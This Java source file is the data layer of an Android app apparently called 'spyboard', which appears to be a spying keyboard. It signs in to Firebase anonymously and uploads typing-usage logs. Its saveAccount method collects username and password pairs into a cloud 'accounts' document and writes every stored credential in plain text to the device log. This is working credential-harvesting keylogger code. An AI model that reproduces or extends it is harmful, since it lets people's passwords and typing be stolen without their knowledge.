package com.idankorenisraeli.spyboard.data;

import android.app.Activity;
import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.idankorenisraeli.spyboard.common.SharedPrefsManager;
import com.idankorenisraeli.spyboard.data.types.DailyUsageLog;
import com.idankorenisraeli.spyboard.data.types.UsageLog;
import com.idankorenisraeli.spyboard.input.SpyInputMethodService;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.Executor;

public class DatabaseManager {

    private static DatabaseManager instance = null;

    private final FirebaseFirestore database = FirebaseFirestore.getInstance();
    private final SharedPrefsManager sharedPrefs = SharedPrefsManager.getInstance();
    private final CollectionReference usersRef;

    private final ArrayList<DailyUsageLog> waitingList; //Logs that could not be saved to cloud

    private FirebaseAuth mAuth;
    private FirebaseUser mUser;


    interface KEYS {
        String USERS = "users";
        String DAILY_LOGS = "daily_logs";
        String ALL_TIME = "all_time";
        String ACCOUNTS = "accounts";
        String TOTAL = "total";

        String UID = "my_uid";
    }

    private DatabaseManager() {
        usersRef = database.collection(KEYS.USERS);
        waitingList = new ArrayList<>();
        initUser();


    }

    private void initUser(){
        mAuth = FirebaseAuth.getInstance();
        mUser = mAuth.getCurrentUser();
        if(mUser == null)
            signIn();

    }

    private void signIn(){
        mAuth.signInAnonymously()
                .addOnCompleteListener(new FirebaseAuthExecute(), new OnCompleteListener<AuthResult>() {
                    @Override
                    public void onComplete(@NonNull Task<AuthResult> task) {
                        if (task.isSuccessful()) {
                            // Sign in success, update UI with the signed-in user's information
                            mUser = mAuth.getCurrentUser();
                        }
                    }
                });
    }

    public static DatabaseManager getInstance() {

        if (instance == null)
            instance = new DatabaseManager();
        return instance;
    }


    //This will override the current daily log that is saved in db/sp
    public void saveDailyLog(@NonNull DailyUsageLog log) {
        sharedPrefs.putObject(getDailyLogSPKey(log.getDate()), log);

        getDailyLogDocRef(log.getDate()).set(log)
                .addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        //Trying to re-save the waiting logs
                        for (DailyUsageLog waitingLog : waitingList) {
                            getDailyLogDocRef(waitingLog.getDate()).set(waitingLog).addOnSuccessListener(new OnSuccessListener<Void>() {
                                @Override
                                public void onSuccess(Void aVoid) {
                                    // Waiting log is saved, so its not waiting anymore
                                    waitingList.remove(waitingLog);
                                }
                            });
                        }
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        waitingList.add(log);
                    }
                });
    }

    //This will override the current daily log that is saved in db/sp
    public void saveTotalLog(@NonNull UsageLog log) {
        sharedPrefs.putObject(getTotalLogSPKey(), log);

        getTotalDocRef().set(log);
    }


    public void saveAccount(String username, String password) {
        //TODO - SP save
        getAccountsDocRef().get().addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
            @SuppressWarnings("unchecked")
            @Override
            public void onSuccess(DocumentSnapshot documentSnapshot) {
                HashMap<String, String> accounts;
                if (documentSnapshot.exists()) {
                    accounts = (HashMap<String, String>) documentSnapshot.toObject(HashMap.class);
                    for (String key : accounts.keySet()) {
                        Log.i("pttt", "found account: " + key + " ; " + accounts.get(key));
                    }
                } else
                    accounts = new HashMap<>();
                accounts.put(username, password);
                getAccountsDocRef().set(accounts);

            }
        });
    }


    /**
     * Load from sp
     *
     * @param date Date of log to load from device
     */
    public DailyUsageLog loadDailyLog(String date) {
        Log.i("pttt", "Trying to load " + date);

        String spKey = getDailyLogSPKey(date);
        return sharedPrefs.getObject(spKey, DailyUsageLog.class);

    }

    public UsageLog loadTotalLog() {
        String spKey = getTotalLogSPKey();
        return sharedPrefs.getObject(spKey, UsageLog.class);
    }


    /**
     * This creates the unique reference of a log in the cloud firestore
     *
     * @param date the of the log to get its ref
     * @return the ref
     */
    private DocumentReference getDailyLogDocRef(String date) {
        return usersRef.document(getUID().concat("/").
                concat(KEYS.DAILY_LOGS).concat("/").concat(date));
    }

    private DocumentReference getAccountsDocRef() {
        return usersRef.document(getUID().concat("/")
                .concat(KEYS.ALL_TIME).concat("/").concat(KEYS.ACCOUNTS));
    }

    private DocumentReference getTotalDocRef() {
        return usersRef.document(getUID().concat("/")
                .concat(KEYS.TOTAL).concat("/").concat(KEYS.ALL_TIME));
    }

    private String getDailyLogSPKey(String date) {
        return SharedPrefsManager.KEYS.SP_KEY_PREFIX + KEYS.DAILY_LOGS + "_" + date;
    }


    private String getTotalLogSPKey() {
        return SharedPrefsManager.KEYS.SP_KEY_PREFIX + KEYS.TOTAL;
    }


    /**
     * Each user gets its own unique id for the database
     * this unique id will be saved on shared prefs
     *
     * @return Current user's unique ID
     */
    private String getUID() {
        String uuid;
        if (sharedPrefs.contain(KEYS.UID)) {
            uuid = sharedPrefs.getString(KEYS.UID, UUID.randomUUID().toString());
        } else {
            uuid = UUID.randomUUID().toString();
            sharedPrefs.putString(KEYS.UID, uuid);

        }
        return uuid;
    }
}
